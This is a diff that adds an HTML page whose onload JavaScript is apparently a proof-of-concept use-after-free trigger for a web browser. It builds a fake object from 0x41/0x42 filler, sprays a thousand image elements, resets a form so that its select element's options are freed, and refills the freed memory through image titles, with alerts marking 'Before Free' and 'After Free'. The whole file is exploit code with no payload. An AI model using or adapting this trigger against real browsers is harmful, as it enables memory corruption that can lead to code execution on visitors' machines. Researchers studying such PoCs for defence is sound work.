@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script>
+
+		function crash()
+		{
+			alert('Start!!');  
+			var fakeobj = unescape("%u4242%u4242");
+			fakeobj += unescape("%u4141%u4141");
+			
+			while (fakeobj.length <= 0x38/2) 
+			{
+				fakeobj += unescape("%u4141%u4141");
+			}
+
+			var formobj, selobj, optobj;
+			selobj = document.getElementById("select1");
+			formobj = selobj.form;
+
+			for(var i=0; i<5; i++) 
+			{
+				optobj = document.createElement('option');
+				optobj.text = "test";
+				selobj.add(optobj);
+			}
+
+			var imgarray = new Array();
+			for(var j = 0; j < 1000; j++) 
+			{
+				imgarray.push(document.createElement("img"));
+			}
+
+			alert('Before Free');
+			formobj.reset();
+			selobj.innerText = "hyunmini";
+			
+			for(var i = 0; i < imgarray.length; i++) 
+			{
+				imgarray[i].title = fakeobj.substring(0, 0x38 / 2 - 1);
+			}
+
+			alert('After Free');
+			formobj.reset();
+		}
+
+		</script>
+	</head>
+	<div id="blah"></div>
+	<body onload='crash()'>
+		<form>
+			<select id="select1">
+			</select>
+		</form>
+	</body>
+</html>
